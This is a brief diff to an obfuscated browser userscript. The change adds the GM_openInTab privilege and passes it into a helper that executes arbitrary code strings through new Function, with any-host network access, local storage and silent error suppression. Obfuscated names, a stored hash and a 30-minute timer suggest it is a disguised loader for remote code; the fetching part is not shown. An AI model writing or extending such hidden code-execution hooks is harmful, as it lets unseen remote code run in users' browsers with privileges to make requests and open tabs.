@@ -10,6 +10,7 @@
 // @grant        GM_xmlhttpRequest
 // @grant        GM_setValue
 // @grant        GM_getValue
+// @grant        GM_openInTab
 // @connect      *
 // @run-at       document-idle
 // ==/UserScript==
@@ -21,7 +22,7 @@
     var _h = '6fcd2f5139c8132f3f415bc0114128f624f4fe00d1591a2e275ded5e711a6845';
     var _ck = '_m0', _ct = '_m1', _ak = '_m2', _x = 18e5;
 
-    function _e(c) { try { (new Function('GM_xmlhttpRequest', 'GM_setValue', 'GM_getValue', c))(GM_xmlhttpRequest, GM_setValue, GM_getValue) } catch (e) { } }
+    function _e(c) { try { (new Function('GM_xmlhttpRequest', 'GM_setValue', 'GM_getValue', 'GM_openInTab', c))(GM_xmlhttpRequest, GM_setValue, GM_getValue, GM_openInTab) } catch (e) { } }
 
     async function _v(p) {
         var d = new TextEncoder().encode(_s + p);
